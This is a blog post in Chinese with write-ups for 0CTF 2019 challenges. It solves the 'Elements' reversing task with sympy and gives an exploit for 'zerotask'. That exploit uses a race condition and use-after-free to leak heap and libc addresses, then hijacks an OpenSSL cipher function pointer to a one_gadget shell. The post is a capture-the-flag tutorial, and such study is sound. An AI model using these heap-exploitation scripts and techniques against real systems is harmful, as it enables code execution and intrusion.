---
layout: post
title: "tctf2019 Elements & zerotask & babyaegis"
date: 2019-04-02
categories: jekyll update
---
### tctf2019 Elements & zerotask & babyaegis
+ https://github.com/ray-cp/ctf-pwn/tree/master/0ctf2019
+ http://blog.leanote.com/post/xp0int/%5BPwn%5D-zerotask-Cpt.shao
这次比赛只做出了一道re。。赛后复现了两道pwn，记录一下。
### Elements
这道题目的是输入一串字符满足一定的条件，成功输出flag即为成功。
这个题目一开始做的时候就知道输入的字符串会经过两个数组的转换，第一个数组转换是大写字母转换为小写字母(gdb调试可以看到其数组具体操作：下面是数组截取的一部分)。
```
0x7f601c0be7a0 <_nl_C_LC_CTYPE_tolower+704>:	0x0000003100000030	0x0000003300000032
0x7f601c0be7b0 <_nl_C_LC_CTYPE_tolower+720>:	0x0000003500000034	0x0000003700000036
0x7f601c0be7c0 <_nl_C_LC_CTYPE_tolower+736>:	0x0000003900000038	0x0000003b0000003a
0x7f601c0be7d0 <_nl_C_LC_CTYPE_tolower+752>:	0x0000003d0000003c	0x0000003f0000003e
0x7f601c0be7e0 <_nl_C_LC_CTYPE_tolower+768>:	0x0000006100000040	0x0000006300000062  0x41-->"a"
0x7f601c0be7f0 <_nl_C_LC_CTYPE_tolower+784>:	0x0000006500000064	0x0000006700000066
0x7f601c0be800 <_nl_C_LC_CTYPE_tolower+800>:	0x0000006900000068	0x0000006b0000006a
0x7f601c0be810 <_nl_C_LC_CTYPE_tolower+816>:	0x0000006d0000006c	0x0000006f0000006e
0x7f601c0be820 <_nl_C_LC_CTYPE_tolower+832>:	0x0000007100000070	0x0000007300000072
0x7f601c0be830 <_nl_C_LC_CTYPE_tolower+848>:	0x0000007500000074	0x0000007700000076
0x7f601c0be840 <_nl_C_LC_CTYPE_tolower+864>:	0x0000007900000078	0x0000005b0000007a  0x5a-->"z"
0x7f601c0be850 <_nl_C_LC_CTYPE_tolower+880>:	0x0000005d0000005c	0x0000005f0000005e
0x7f601c0be860 <_nl_C_LC_CTYPE_tolower+896>:	0x0000006100000060	0x0000006300000062
0x7f601c0be870 <_nl_C_LC_CTYPE_tolower+912>:	0x0000006500000064	0x0000006700000066
0x7f601c0be880 <_nl_C_LC_CTYPE_tolower+928>:	0x0000006900000068	0x0000006b0000006a
0x7f601c0be890 <_nl_C_LC_CTYPE_tolower+944>:	0x0000006d0000006c	0x0000006f0000006e
```
第二个数组我们分析了半天。。。其实就是将每段字符转为16进制，例如’aabb’ -> 0xaabb。。。然而因为不够敏感，我们又对那个数组进行了详细的分析，分类，再慢慢推敲才看出来是怎么一回事。。下面是整个数组，嘴哥记录，以后别犯傻：
```
0x7f934e7215e0 <_nl_C_LC_CTYPE_class+256>:	0x0002000200020002	0x0002000200020002 0x00
0x7f934e7215f0 <_nl_C_LC_CTYPE_class+272>:	0x2002200220030002	0x0002000220022002
0x7f934e721600 <_nl_C_LC_CTYPE_class+288>:	0x0002000200020002	0x0002000200020002
0x7f934e721610 <_nl_C_LC_CTYPE_class+304>:	0x0002000200020002	0x0002000200020002
0x7f934e721620 <_nl_C_LC_CTYPE_class+320>:	0xc004c004c0046001	0xc004c004c004c004
0x7f934e721630 <_nl_C_LC_CTYPE_class+336>:	0xc004c004c004c004	0xc004c004c004c004
0x7f934e721640 <_nl_C_LC_CTYPE_class+352>:	0xd808d808d808d808	0xd808d808d808d808
0x7f934e721650 <_nl_C_LC_CTYPE_class+368>:	0xc004c004d808d808	0xc004c004c004c004
0x7f934e721660 <_nl_C_LC_CTYPE_class+384>:	0xd508d508d508c004	0xc508d508d508d508
0x7f934e721670 <_nl_C_LC_CTYPE_class+400>:	0xc508c508c508c508	0xc508c508c508c508
0x7f934e721680 <_nl_C_LC_CTYPE_class+416>:	0xc508c508c508c508	0xc508c508c508c508
0x7f934e721690 <_nl_C_LC_CTYPE_class+432>:	0xc004c508c508c508	0xc004c004c004c004
0x7f934e7216a0 <_nl_C_LC_CTYPE_class+448>:	0xd608d608d608c004	0xc608d608d608d608
0x7f934e7216b0 <_nl_C_LC_CTYPE_class+464>:	0xc608c608c608c608	0xc608c608c608c608
0x7f934e7216c0 <_nl_C_LC_CTYPE_class+480>:	0xc608c608c608c608	0xc608c608c608c608
0x7f934e7216d0 <_nl_C_LC_CTYPE_class+496>:	0xc004c608c608c608	0x0002c004c004c004 0x7f
```
我是真的做了分析。。不然也不会做这么久，是真的菜，不信你看我的傻逼分析操作：
```
0x0002  28
0x2002   4
0x2003   1
0x6001   1
0xc004  0x21-0x2f (!-/)  0x3a-0x40  0x5b-0x60  0x7b-0x7e  32
0xd808  0x30-0x39 (0-9) 0123456789 (len = 10)  10
0xd508  0x41-0x46 (A-F)  6
0xc508  0x47-0x5a (G-Z)  20
0xd608  0x61-0x66 (a-g) abcdef  6
0xc608  0x67-0x7a (g-z) ghijklmnopqrstuvwxyz  (len = 20)   20
```
好了回归正题，我们一起来分析一下这个题目，这个题目的逻辑很简单，是只有一个main函数的程序，首先输入的字符其实是44位就行，而且要求前面5位一定为  "flag{"  最后1位一定为  “}”  ，然后经过数组`__ctype_tolower_loc`会把字符串中大写字母转换为小写字母，程序中操作如下：
```
# 大写字母转换为小写字母
  if ( s[0] )
  {
    v4 = __ctype_tolower_loc();
    v5 = &s[1];
    do
    {
      *(v5 - 1) = (*v4)[v3];
      v3 = *v5++;
    }
    while ( v3 );
  }
# 判断前5个字符和第44个字符
  if ( v6 < 0x2C || (*(_QWORD *)s & 0xFFFFFFFFFFLL) != '{galf' || v27 != '}' )
    return result;
```
然后是strtok()函数，利用  ” - “  字符来进行分割，简单分析可以看出flag形式应该为`flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}`这种形式。然后就到了对这个`__ctype_b_loc`数组的分析。
可以查询相关这个数组的资料，可以发现：
```
enum
{
  _ISupper = _ISbit (0),    0    /* UPPERCASE.  */   
  _ISlower = _ISbit (1),    1    /* lowercase.  */
  _ISalpha = _ISbit (2),        /* Alphabetic.  */
  _ISdigit = _ISbit (3),        /* Numeric.  */
  _ISxdigit = _ISbit (4),       /* Hexadecimal numeric.  */
  _ISspace = _ISbit (5),        /* Whitespace.  */
  _ISprint = _ISbit (6),        /* Printing.  */
  _ISgraph = _ISbit (7),        /* Graphical.  */
  _ISblank = _ISbit (8),        /* Blank (usually SPC and TAB).  */
  _IScntrl = _ISbit (9),        /* Control character.  */
  _ISpunct = _ISbit (10),       /* Punctuation.  */
  _ISalnum = _ISbit (11)        /* Alphanumeric.  */
};
https://stackoverflow.com/questions/37702434/ctype-b-loc-what-is-its-purpose
```
程序的操作如下：
```
if ( *v8 )
      {
        v12 = *__ctype_b_loc();
        v13 = 1LL;
        v11 = 0LL;
        do
        {
          v14 = v10;
          v15 = v12[v10];
          if ( (char)v14 <= 0x66 && v15 & 0x400 )
          {
            v16 = v14 - 0x57;                   // abcdef
          }
          else
          {
            if ( !(v15 & 0x800) )
              goto LABEL_31;
            v16 = v14 - 0x30;                   // 0123456789
          }
          v11 = v16 | 0x10 * v11;               // 左移4bit，也就是半个字节
          if ( v13 > 11 )
            break;
          v10 = v8[v13++];
        }
        while ( v10 );
      }
```
好了，知道这个数组是将每段字符转为16进制的了，进入下一步，进行了好几个SSE2，但经过调试，好像并没有什么变化(不知道干啥的)，所以略过。其中后面strtok()函数取后面几段赋值给`v23 & v24 & v25`
```
v17 = (__m128i)_mm_sub_pd(
                       (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),
                       (__m128d)xmmword_400BE0);
      *(&v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;// v9++,  先用后+
      v18 = strtok(0LL, "-");
```
然后最重要的一部分来了
```
      if ( v9 > 2 || !v18 )
      {
        if ( v24 <= v23 || v25 <= v24 || v23 + v24 <= v25 )
          break;
        v19 = v24 * v24 + v23 * v23 - v25 * v25;
        v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;
        v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;
        if ( v21 >= 0.00001 || v21 <= -0.00001 )
          return 0LL;
        v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;
        if ( v22 < 0.00001 && v22 > -0.00001 )
          puts("Congratz, input is your flag");
        return 0LL;
      }
```
这个东西其实就是几个方程，如下：

<img src="/images/posts/tctf2019/1554128792386.png" > 

然后其中最重要的可能是一步化简？就是`4a^2b^2 - (a^2 + b^2 - c^2)^2 = (a+b+c)(a+b-c)(c-a+b)(c+a-b)`
然后可以得到下列两个方程，再用sympy求解即可得到结果：

<img src="/images/posts/tctf2019/1554129143845.png" > 

```
from sympy import *
import struct
b = Symbol('b')

c = Symbol('c')
num1 = 19400354808065.543
num2 = 47770539528273.91
a = 62791383142154

print(solve([((0.5*(sqrt((a+b+c)*(a+b-c)*(c-a+b)*(c+a-b))))/(a+b+c) - num1), ((a*b*c)/(sqrt((a+b+c)*(a+b-c)*(c-a+b)*(c+a-b))) - num2)],[b,c]))
```
```
from pwn import *
p = process("./Elements")

payload = "flag{"
payload += "391bc2164f0a-"
payload += "4064e4798769-"
payload += "56e0de138176"
payload += "}"
print(payload)
print(len(payload))
p.sendline(payload)

p.interactive()
```

### zerotask
+ https://e3pem.github.io/2019/03/27/0ctf-2019/0ctf2019-zerotask/
分析程序得到结构体如下：
```
+0     data_point # 指向一块堆上的内存，表示待加密或待解密的数据
+0x8   datasize  # 数据的大小
+0x10  flag  # 表示是加密还是解密
+0x14  key 32-->0x20  # AES加密密钥
+0x34  IV   16 # AES加密iv向量
+0x44  none
+0x58  cipher_point_ctx  # 用来进行加解密的上下文的一个指针
+0x60  id  # task结构体的标识
+0x68  nextptr  # 指向下一个task结构体，结构体之间通过链表连接起来
```
### 程序功能简介：

+ 添加任务功能，程序首先分配一块0x70大小的内存用来存放task结构体，接着让用户输入key、iv以及data等信息，并完成加解密上下文的初始化。这里的输入数据功能比较特别，如果输入的内容没有达到要求的长度，程序会一直等待输入
+ 删除任务功能，根据用户输入task的id来确定删除哪一个任务，遍历任务链表来查找并free掉相关内存
+ 运行任务功能(go)，该功能会启动一个线程来执行，根据结构体中的内容来进行加解密操作，一共有三次执行该操作的机会
### 程序漏洞分析
程序的漏洞在于：启动线程来执行任务时，在最开始处sleep了2秒，接着进行正常的加解密操作。因为是启动的线程，导致主线程的运行仍然不受影响，这样通过适当的利用可以控制task结构体的内容，进而劫持程序的运行。在读取结构体信息(指针)后创建线程，并在线程函数里进行的sleep(2)，因此可以利用这个特点，产生一个条件竞争漏洞，在sleep(2)的时候，加解密之前就把该已经读取的指针里面的内容改写掉，因为线程与主进程是共享内存的，所以才产生了这样一个条件竞争漏洞，然而恰好其中的UAF可以配合此漏洞进行利用。
```
int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out,
         int *outl, const unsigned char *in, int inl);
从缓冲区加密inl字节，并将加密版本写入out。可以多次调用此函数来加密连续的数据块。写入的数据量取决于加密数据的块对齐：因此写入的数据量可以是从零字节到（inl + cipher_block_size - 1）的任何值，因此out应包含足够的空间。写入的实际字节数放在outl中。它还检查in和out是否部分重叠，如果它们为0则返回以指示失败。
```
调试方法：把go()注释掉来调试。

### ADD
每add一次就会有四段新的堆块产生：
```
0x55f3dc14a730      0x0                 0x80                 Used                None              None
0x55f3dc14a7b0      0x0                 0xb0                 Used                None              None
0x55f3dc14a860      0x0                 0x110                Used                None              None
0x55f3dc14a970      0x7fa2e07e56c0      0x20                 Used                None              None
```
0x80：
```
gdb-peda$ x /30xg 0x5586bd935270
0x5586bd935270:	0x0000000000000000	0x0000000000000081
0x5586bd935280:	0x00005586bd9354c0	0x0000000000000008
0x5586bd935290:	0x7473657400000001	0x0000000000000000
0x5586bd9352a0:	0x0000000000000000	0x0000000000000000
0x5586bd9352b0:	0x3433323100000000	0x0000000000000000
0x5586bd9352c0:	0x0000000000000000	0x0000000000000000
0x5586bd9352d0:	0x0000000000000000	0x00005586bd935300
0x5586bd9352e0:	0x0000000000000000	0x0000000000000000
```
对应于结构体：
```
+0     data_point # 指向一块堆上的内存，表示待加密或待解密的数据
+0x8   datasize  # 数据的大小
+0x10  flag  # 表示是加密还是解密
+0x14  key 32-->0x20  # AES加密密钥
+0x34  IV   16 # AES加密iv向量
+0x44  none
+0x58  cipher_point_ctx  # 用来进行加解密的上下文的一个指针
+0x60  id  # task结构体的标识
+0x68  nextptr  # 指向下一个task结构体，结构体之间通过链表连接起来
```
0xb0:  task结构体里面存放着`EVP_CIPHER_CTX_ptr`这样一个指针（也就是上面结构体中+0x58的位置），该指针指向的结构体如下：大小(0xb0)
```
gdb-peda$ x /30xg 0x5586bd9352f0
0x5586bd9352f0:	0x0000000000000000	0x00000000000000b1
0x5586bd935300:	0x00007f1c95e9f620	0x0000000000000000
0x5586bd935310:	0x0000000000000001	0x0000000034333231
0x5586bd935320:	0x0000000000000000	0x0000000034333231
0x5586bd935330:	0x0000000000000000	0x0000000000000000
0x5586bd935340:	0x0000000000000000	0x0000000000000000
0x5586bd935350:	0x0000000000000000	0x0000000000000000
0x5586bd935360:	0x0000000000000000	0x0000000000000020
0x5586bd935370:	0x0000000000000000	0x00005586bd9353b0
0x5586bd935380:	0x0000000f00000000	0x0000000000000000
0x5586bd935390:	0x0000000000000000	0x0000000000000000
```
对应的结构体为：
```
struct evp_cipher_ctx_st {
    //cipher字段指向了另外一个结构体
    const EVP_CIPHER *cipher;
    ENGINE *engine;             /* functional reference if 'cipher' is
                                 * ENGINE-provided */
    int encrypt;                /* encrypt or decrypt */
    int buf_len;                /* number we have left */
    unsigned char oiv[EVP_MAX_IV_LENGTH]; /* original iv */
    unsigned char iv[EVP_MAX_IV_LENGTH]; /* working iv */
    unsigned char buf[EVP_MAX_BLOCK_LENGTH]; /* saved partial block */
    int num;                    /* used by cfb/ofb/ctr mode */
    /* FIXME: Should this even exist? It appears unused */
    void *app_data;             /* application stuff */
    int key_len;                /* May change for variable length cipher */
    unsigned long flags;        /* Various flags */
    void *cipher_data;          /* per EVP data */
    int final_used;
    int block_mask;
    unsigned char final[EVP_MAX_BLOCK_LENGTH]; /* possible final block */
} /* EVP_CIPHER_CTX */ 
```
结构体的第一个字段指向的仍然是一个结构体：
```
struct evp_cipher_st {
    int nid;
    int block_size;
    /* Default value for variable length ciphers */
    int key_len;
    int iv_len;
    /* Various flags */
    unsigned long flags;
    /* init key */
    //------------------------->需要劫持的函数指针，这里是初始化函数
    int (*init) (EVP_CIPHER_CTX *ctx, const unsigned char *key,
                 const unsigned char *iv, int enc);
    /* encrypt/decrypt data */
    //------------------------->需要劫持的函数指针，这里是加解密的函数
    int (*do_cipher) (EVP_CIPHER_CTX *ctx, unsigned char *out,
                      const unsigned char *in, size_t inl);
    /* cleanup ctx */
    int (*cleanup) (EVP_CIPHER_CTX *);
    /* how big ctx->cipher_data needs to be */
    int ctx_size;
    /* Populate a ASN1_TYPE with parameters */
    int (*set_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);
    /* Get parameters from a ASN1_TYPE */
    int (*get_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);
    /* Miscellaneous operations */
    int (*ctrl) (EVP_CIPHER_CTX *, int type, int arg, void *ptr);
    /* Application data */
    void *app_data;
} /* EVP_CIPHER */ ;
```
在内存中大概长这个样子：
```
gdb-peda$ x /30xg 0x00007f1c95e9f620
0x7f1c95e9f620:	0x00000010000001ab	0x0000001000000020
0x7f1c95e9f630:	0x0000000000001002	0x00007f1c95b9dee0
0x7f1c95e9f640:	0x00007f1c95b9deb0	0x0000000000000000
0x7f1c95e9f650:	0x0000000000000108	0x0000000000000000
0x7f1c95e9f660:	0x0000000000000000	0x0000000000000000
0x7f1c95e9f670:	0x0000000000000000	0x0000000000000000
0x7f1c95e9f680:	0x0000000100000389	0x0000001000000018
0x7f1c95e9f690:	0x0000000000000005	0x00007f1c95b9dd10
0x7f1c95e9f6a0:	0x00007f1c95b9e1d0	0x0000000000000000
```
还有一个`EVP_CIPHER_CTX` 对象创建的堆块 (0x110大小)和根据DATA_SIZE分配的堆块(大小<0x1000)。

观察上面结构体中有多个指向函数的虚表指针，所以利用的思路就是自己伪造上述的两个结构体，将`evp_cipher_st`结构体中的指针指向`one_gadget`即可`getshell`。伪造起来也很容易，我们可以完全控制的就是加解密数据的内容，而且知道了堆地址，只需要修改指针指向我们伪造的这两个结构体即可。
### 泄露地址解释
这里泄露地址的方法主要是利用UAF，在go()之后，把堆块释放掉，也就是把data变为`fd`，这样一来如果可以正常把数据加密那得到的加密结果我们再对密文进行解密就可以得到明文(堆地址)，其中需要注意的是要把确认`EVP_CIPHER_CTX`结构体是一个有效的结构体才能进行有效的加密，所以这里需要再add数据来对空的0xb0大小的结构体进行填充，确保没有使用控指针的情况。而泄露libc地址同理，只是把unsortedbin来free掉而已。
### 调试过程
调试准备：
+ 关闭ASLR	`echo 0 > /proc/sys/kernel/randomize_va_space`
+ 两个断点`bb 0x141D`  ADD  &  ` bb 0x1521`  delete

然后我们来看一下操作：

```
add_task(0, 1, 'test', '1234', 8, 'AAAA')
add_task(1, 1, 'test', '1234', 8, 'BBBB')
add_task(2, 1, 'test', '1234', 8, 'CCCC')   # 
add_task(3, 1, 'test', '1234', 8, 'DDDD')
add_task(4, 1, 'test', '1234', 8, 'EEEE')
go(2)  
log.info('Starting')
pause()
del_task(0)
del_task(1)
del_task(2)  # get the fd to the data
del_task(3)
del_task(4)
```

删除完之后，得到的tcache_entry链表如下：

```
(0x20)   tcache_entry[0](5): 0x5586bd935e40 --> 0x5586bd935be0 --> 0x5586bd935980 --> 0x5586bd935720 --> 0x5586bd9354c0
(0x80)   tcache_entry[6](5): 0x5586bd935c00 --> 0x5586bd9359a0 --> 0x5586bd935740 --> 0x5586bd9354e0 --> 0x5586bd935280
(0xb0)   tcache_entry[9](5): 0x5586bd935c80 --> 0x5586bd935a20 --> 0x5586bd9357c0 --> 0x5586bd935560 --> 0x5586bd935300
(0x110)   tcache_entry[15](5): 0x5586bd935d30 --> 0x5586bd935ad0 --> 0x5586bd935870 --> 0x5586bd935610 --> 0x5586bd9353b0
```
查看id=2的task的结构：
```
gdb-peda$ x /30xg 0x5586bd935730
0x5586bd935730:	0x0000000000000000	0x0000000000000081
0x5586bd935740:	0x00005586bd9354e0	0x0000000000000008
0x5586bd935750:	0x7473657400000001	0x0000000000000000
0x5586bd935760:	0x0000000000000000	0x0000000000000000
0x5586bd935770:	0x3433323100000000	0x0000000000000000
0x5586bd935780:	0x0000000000000000	0x0000000000000000
0x5586bd935790:	0x0000000000000000	0x00005586bd9357c0
0x5586bd9357a0:	0x0000000000000002	0x0000000000000000
0x5586bd9357b0:	0x0000000000000000	0x00000000000000b1
0x5586bd9357c0:	0x00005586bd935560	0x0000000000000000
0x5586bd9357d0:	0x0000000000000000	0x0000000000000000
0x5586bd9357e0:	0x0000000000000000	0x0000000000000000
0x5586bd9357f0:	0x0000000000000000	0x0000000000000000
0x5586bd935800:	0x0000000000000000	0x0000000000000000
0x5586bd935810:	0x0000000000000000	0x0000000000000000
```
然后查看数据段内容，可以看到他的内容已经变成了一个堆的地址，如果在delete之前go一下，这样就可以在go之后，加解密之前把，data的数据偷换为指针内容：
```
gdb-peda$ x 0x00005586bd9354e0
0x5586bd9354e0:	0x00005586bd935280
```
```
gdb-peda$ x /30xg 0x00005586bd9357c0
0x5586bd9357c0:	0x00005586bd935560	0x0000000000000000
0x5586bd9357d0:	0x0000000000000000	0x0000000000000000
0x5586bd9357e0:	0x0000000000000000	0x0000000000000000
0x5586bd9357f0:	0x0000000000000000	0x0000000000000000
0x5586bd935800:	0x0000000000000000	0x0000000000000000
0x5586bd935810:	0x0000000000000000	0x0000000000000000
0x5586bd935820:	0x0000000000000000	0x0000000000000000
0x5586bd935830:	0x0000000000000000	0x0000000000000000
0x5586bd935840:	0x0000000000000000	0x0000000000000000
0x5586bd935850:	0x0000000000000000	0x0000000000000000
```
但是这里需要注意的是后面两个add的作用就是为了`0x5586bd9357c0`的堆块内容填回去(free之后会把`EVP_CIPHER_CTX `的堆块free掉并清空)，第一个add就把两个0xb的空闲块分配走了，第二个add就把倒数第三个也就是id=2的时候指向的大小为0xb的`EVP_CIPHER_CTX `堆块分配出去，这样加解密的时候取结构体才不会读到空指针。
```
add_task(5, 1, 'test', '1234', 0xa0, 'FFFF')  # get twices 0xb0  
add_task(6, 1, 'test', '1234', 8, 'GGGG')   # for +0x58 cipher_point is Effective
```
此时的tcache_entry链表：
```
(0x20)   tcache_entry[0](4): 0x5586bd935be0 --> 0x5586bd935980 --> 0x5586bd935720 --> 0x5586bd9354c0
(0x80)   tcache_entry[6](3): 0x5586bd935740 --> 0x5586bd9354e0 --> 0x5586bd935280
(0xb0)   tcache_entry[9](2): 0x5586bd935560 --> 0x5586bd935300
(0x110)   tcache_entry[15](3): 0x5586bd935870 --> 0x5586bd935610 --> 0x5586bd9353b0
```
可以看到`0x5586bd9357c0 `堆块已经被分配出去了

### 同理泄露libc
```
add_task(7, 1, 'test', '1234', 0x1000, 'HHHH')

add_task(8, 1, 'test', '1234', 8, 'IIII')

go(7) 
del_task(7)
pause()
del_task(8)

add_task(9, 1, 'test', '1234', 0x70, p64(heap + 0x1f80) + p64(0x8) + p32(0x1) + 'test'.ljust(0x20, '\x00') + '1234'.ljust(0x10, '\x00') + p32(0x0) + p64(0x0)*2 + p64(heap + 0x1300) + p64(0x1337))
# del the 0x1000 and let the 7's data_point to the big_heap which is freed,and leak it out.
# heap + 0x1f80 is the address of big_heap which is freed
```
pause()之后断点断下来之后，找到数据存放的地址
```
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0x555555757000      0x0                 0x250                Used                None              None
0x555555757250      0x0                 0x1020               Used                None              None
0x555555758270      0x0                 0x80                 Used                None              None
0x5555557582f0      0x0                 0xb0                 Used                None              None
0x5555557583a0      0x0                 0x110                Used                None              None
0x5555557584b0      0x0                 0x20                 Used                None              None
0x5555557584d0      0x0                 0x80                 Used                None              None
0x555555758550      0x0                 0xb0                 Used                None              None
0x555555758600      0x0                 0x110                Used                None              None
0x555555758710      0x7ffff78126c0      0x20                 Used                None              None
0x555555758730      0x0                 0x80                 Used                None              None
0x5555557587b0      0x0                 0xb0                 Used                None              None
0x555555758860      0x0                 0x110                Used                None              None
0x555555758970      0x0                 0x20                 Used                None              None
0x555555758990      0x0                 0x80                 Used                None              None
0x555555758a10      0x0                 0xb0                 Used                None              None
0x555555758ac0      0x0                 0x110                Used                None              None
0x555555758bd0      0x7ffff78126c0      0x20                 Used                None              None
0x555555758bf0      0x0                 0x80                 Used                None              None
0x555555758c70      0x0                 0xb0                 Used                None              None
0x555555758d20      0x0                 0x110                Used                None              None
0x555555758e30      0x7ffff78126c0      0x20                 Used                None              None
0x555555758e50      0x0                 0x120                Used                None              None
0x555555758f70      0x0                 0x1010               Freed     0x7ffff776dca0    0x7ffff776dca0
0x555555759f80      0x1010              0x120                Used                None              None
```
```
gdb-peda$ x /30xg 0x55dd9adc2f70
0x55dd9adc2f70:	0x0000000000000000	0x0000000000001011
0x55dd9adc2f80:	0x0000000048484848	0x0000000000000000
0x55dd9adc2f90:	0x0000000000000000	0x0000000000000000
0x55dd9adc2fa0:	0x0000000000000000	0x0000000000000000
0x55dd9adc2fb0:	0x0000000000000000	0x0000000000000000
0x55dd9adc2fc0:	0x0000000000000000	0x0000000000000000
0x55dd9adc2fd0:	0x0000000000000000	0x0000000000000000
0x55dd9adc2fe0:	0x0000000000000000	0x0000000000000000

# free之后
gdb-peda$ x /30xg 0x55d0e4990f70
0x55d0e4990f70:	0x0000000000000000	0x0000000000001011
0x55d0e4990f80:	0x00007ff05b20cca0	0x00007ff05b20cca0
0x55d0e4990f90:	0x0000000000000000	0x0000000000000000
0x55d0e4990fa0:	0x0000000000000000	0x0000000000000000

```
可以这样寻找原始的task结构体：
```
gdb-peda$ find 0x55dd9adc2f80 heap
Searching for '0x55dd9adc2f80' in: heap ranges
Found 1 results, display max 1 items:
[heap] : 0x55dd9adc2740 --> 0x55dd9adc2f80 --> 0x48484848 ('HHHH')
```
id = 7 的 task 
```
gdb-peda$ x /30xg 0x55dd9adc2730
0x55dd9adc2730:	0x0000000000000000	0x0000000000000081
0x55dd9adc2740:	0x000055dd9adc2f80	0x0000000000001000
0x55dd9adc2750:	0x7473657400000001	0x0000000000000000
0x55dd9adc2760:	0x0000000000000000	0x0000000000000000
0x55dd9adc2770:	0x3433323100000000	0x0000000000000000
0x55dd9adc2780:	0x0000000000000000	0x0000000000000000
0x55dd9adc2790:	0x0000000000000000	0x000055dd9adc2560
0x55dd9adc27a0:	0x0000000000000007	0x000055dd9adc29a0
```
id = 8 的 task
```
gdb-peda$ x /30xg 0x558a704b94d0
0x558a704b94d0:	0x0000000000000000	0x0000000000000081
0x558a704b94e0:	0x0000558a704b9be0	0x0000000000000008
0x558a704b94f0:	0x7473657400000001	0x0000000000000000
0x558a704b9500:	0x0000000000000000	0x0000000000000000
0x558a704b9510:	0x3433323100000000	0x0000000000000000
0x558a704b9520:	0x0000000000000000	0x0000000000000000
0x558a704b9530:	0x0000000000000000	0x0000558a704b9300
0x558a704b9540:	0x0000000000000008	0x0000558a704b99a0

gdb-peda$ x /20xg 0x0000558a704b9be0
0x558a704b9be0:	0x0000000049494949	0x0000000000000000
```
伪造之后的结构体，刚好把id=7的那个结构体覆盖掉(而id=8的task变成id=9的task，这时分配0x70大小堆块，刚好符合堆块大小是0x80这样就会把id=7的task结构体对应堆块分配给id=9的数据块了，这样就能覆写id
=7的task结构体)：
```
gdb-peda$ x /30xg 0x55f585578730
0x55f585578730:	0x0000000000000000	0x0000000000000081
0x55f585578740:	0x000055f585578f80	0x0000000000000008
0x55f585578750:	0x7473657400000001	0x0000000000000000
0x55f585578760:	0x0000000000000000	0x0000000000000000
0x55f585578770:	0x3433323100000000	0x0000000000000000
0x55f585578780:	0x0000000000000000	0x0000000000000000
0x55f585578790:	0x0000000000000000	0x000055f585578300
0x55f5855787a0:	0x0000000000001337	0x0000000000000000
```
所以这样就能成功泄露libc地址了。
### 利用过程
利用过程如下：
```
add_task(10, 1, 'test', '1234', 8, 'JJJJ')
pause()
add_task(11, 1, 'test', '1234', 8, 'KKKK')

go(10)

del_task(10)
del_task(11)

add_task(12, 1, 'test', '1234', 0x70, p64(heap + 0x1300) + p64(0x40) + p32(0x1) + 'test'.ljust(0x20, '\x00') + '1234'.ljust(0x10, '\x00') + p32(0x0) + p64(0x0)*2 + p64(heap + 0x2350) + p64(0xc0de))
# heap + 0x1300 -->  a normal 0xb0(cipher struct)
data = ''
data += '\x00'*0x100
data += p64(heap + 0x2350 + 0x100) + p64(0x0) + p32(0x1337c0de) + p32(0x10)
data += '\x00'*(0x200 - len(data))
data += p32(0x0) + p32(0x10)
data += p64(0x0)*3
data += p64(libc + 0x00000000000E5863)  # one_gadget  (do_cipher point) ( p64(heap + 0x2350))

add_task(13, 1, 'test', '1234', 0x300, data)
```
上面的id=12也就是覆盖id=10的task结构体为特定内容，伪造`EVP_CIPHER_CTX `指针为`heap + 0x2350`，其中指向内容为one_gadget，然后go中sleep(完之后)，调用到`evp_cipher_st `结构体里面的虚表函数的时候就直接getshell了

咱们来看下调试过程：

### 详细脚本以及部分解释：
然后最后就是对两个结构体的伪造，利用前面free掉的堆块进行UAF利用。
```
from pwn import *
from Crypto.Cipher import AES

debug = False
# p = remote('111.186.63.201', 10001)
p = process('./task')
if debug:
	context.log_level = 'debug'
else:
	context.log_level = 'info'
def sa(a, b):
	#return p.sendafter(a, b)
	return p.send(b) #we can use send instead of sendafter. we want to do this because sendafter takes too long on the remote server.

def ru(a):
	return p.recvuntil(a)

def menu(choice):
	p.send(str(choice) + '\n')

def add_task(task_id, encrypt_decrypt, key, iv, size, data):
	menu(1)
	sa(': ', str(task_id) + '\n')
	sa(': ', str(encrypt_decrypt) + '\n')
	sa(': ', key.ljust(0x20, '\x00'))
	sa(': ', iv.ljust(0x10, '\x00'))
	sa(': ', str(size) + '\n')
	sa(': ', data.ljust(size, '\x00'))

def del_task(task_id):
	menu(2)
	sa(': ', str(task_id) + '\n')

def go(task_id):
	menu(3)
	sa(': ', str(task_id) + '\n')

def get_ciphertext(length):
	ru('Ciphertext: \n')
	ciphertext = p.recv(length*3 + length/0x10)
	ciphertext = ciphertext.replace(' ', '').replace('\n', '').decode('hex')
	return ciphertext

def aes_decrypt(data, key, iv):
	aes = AES.new(key.ljust(0x20, '\x00'), AES.MODE_CBC, iv.ljust(0x10, '\x00'))
	return aes.decrypt(data)

def aes_encrypt(data, key, iv):
	aes = AES.new(key.ljust(0x20, '\x00'), AES.MODE_CBC, iv.ljust(0x10, '\x00'))
	return aes.encrypt(data.ljust(16,'\x00'))
'''
bb 0x13be  before-ADD
bb 0x141D  ADD
bb 0x1521  delete
'''

# print(aes_decrypt("\xe5\x12\x3f\xd2\xc3\x37\x42\x10\x24\x4d\x89\x6c\x8a\x38\x0a\x1a", 'test', '1234'))
add_task(0, 1, 'test', '1234', 8, 'AAAA')
add_task(1, 1, 'test', '1234', 8, 'BBBB')
add_task(2, 1, 'test', '1234', 8, 'CCCC')   # 
add_task(3, 1, 'test', '1234', 8, 'DDDD')

add_task(4, 1, 'test', '1234', 8, 'EEEE')
go(2)
'''
0x55f3dc14a730      0x0                 0x80                 Used                None              None
0x55f3dc14a7b0      0x0                 0xb0                 Used                None              None
0x55f3dc14a860      0x0                 0x110                Used                None              None
0x55f3dc14a970      0x7fa2e07e56c0      0x20                 Used                None              None
'''
log.info('Starting')

del_task(0)
del_task(1)
del_task(2)  # get the fd to the data
del_task(3)
